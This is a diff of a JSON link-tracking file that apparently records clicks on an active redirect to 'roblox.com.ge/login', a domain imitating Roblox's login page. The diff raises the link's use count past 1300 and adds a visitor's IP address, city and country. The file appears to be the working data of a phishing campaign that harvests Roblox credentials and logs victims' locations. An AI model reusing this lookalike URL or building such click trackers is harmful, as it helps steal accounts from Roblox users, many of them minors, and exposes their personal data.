@@ -150,7 +150,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1308,
+    "useCount": 1309,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10611,6 +10611,14 @@
       },
       {
         "timestamp": 1777379904871,
+        "ip": "1.169.48.69",
+        "country": "Taiwan",
+        "city": "Yilan",
+        "flag": "🇹🇼",
+        "countryCode": "TW"
+      },
+      {
+        "timestamp": 1777379914358,
         "ip": "1.169.48.69",
         "country": "Taiwan",
         "city": "Yilan",
